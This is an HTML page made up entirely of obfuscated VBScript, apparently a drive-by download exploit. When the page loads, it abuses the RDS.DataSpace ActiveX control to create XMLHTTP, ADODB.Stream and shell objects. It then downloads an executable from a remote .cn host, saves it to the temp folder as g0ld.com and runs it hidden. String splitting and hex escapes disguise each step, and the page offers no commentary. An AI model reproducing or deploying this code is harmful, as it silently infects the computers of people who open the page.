<html>
<script language="VBScript">
on error resume next
Cike="ht"&"tp://d"&"own."&"mal"&"asc."&"cn/6"&"14.e"&"xe"
dl = Cike
Set df = document.createElement("ob"&"ject")
df.setAttribute "cl"&"a"&"ss"&"id", "cl"&"sid:B"&"D9"&"6C55"&"6-65A3-11D0-98"&"3A-00"&"C0"&"4FC29"&"E3"&"6"
str="Microsoft"&".XMLHTTP"
Set x = df.CreateObject(str,"")
a1="Ado"
a2="db."
a3="Str"&"ea"
str1=a1&a2&a3
str5=str1
set S = df.createobject(str5&"m","")
S.type = 1
str6="G"&"ET"
x.Open str6, dl, False
x.Send
fname1="g0ld"&".com"
set F = df.createobject("Scripti"&"ng.FilesystemObject","")
set tmp = F.GetSpecialFolder(2) 
S.open
fname1= F.BuildPath(tmp,fname1)
S.write x.responseBody
S.["\x73\x61\x76\x65\x74\x6f\x66\x69\x6c\x65"] fname1,2
S.close
set Q = df.createobject("Shell.Ap"&"plication","")
Q.ShellExecute fname1,"","","ope"&"n",0
</script>
